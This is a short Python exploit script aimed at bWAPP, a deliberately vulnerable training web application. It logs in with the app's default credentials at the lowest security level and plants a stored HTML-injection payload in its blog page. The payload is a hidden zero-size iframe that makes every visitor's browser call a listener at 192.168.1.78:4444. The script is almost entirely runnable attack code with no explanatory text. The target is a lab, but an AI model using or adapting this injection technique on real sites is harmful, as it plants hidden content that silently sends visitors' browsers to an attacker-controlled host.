#!/usr/bin/env python3

import requests
import sys
import signal
import time


def def_handler(sig, frame):
    print("\nExiting..")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


payload = """<iframe src="http://192.168.1.78:4444/test" height="0" width="0"></iframe>"""


def login():
    session = requests.Session()

    data = {
        "password": "bug",
        "form": "submit",
        "login": "bee",
        "security_level": "0"
    }

    headers = {
        "Origin": "http://bwapp",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = session.post("http://bwapp/login.php", data=data, headers=headers)

        if response.status_code == 200:
            print("LOGIN OK : Status Code %i" % response.status_code)

    except requests.exceptions.RequestException as e:
        print("An error occurred while making the request: %s" % str(e))
        sys.exit(1)

    return session


def def_exploit(session):
    paramsPost = {"entry": payload, "blog": "submit", "entry_add": ""}
    headers = {
        "Origin": "http://bwapp",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = session.post("http://bwapp/htmli_stored.php", data=paramsPost, headers=headers)

        if response.status_code == 200:
            print("HTML DOOM INJECTED SUCCESSFULLY")

    except requests.exceptions.RequestException as e:
        print("An error occurred while making the request: %s" % str(e))
        sys.exit(1)


if __name__ == '__main__':
    print("Starting login...")
    session = login()
    print("Login successful.")
    print("Injecting payload...")
    def_exploit(session)
    print("Payload injected successfully.")
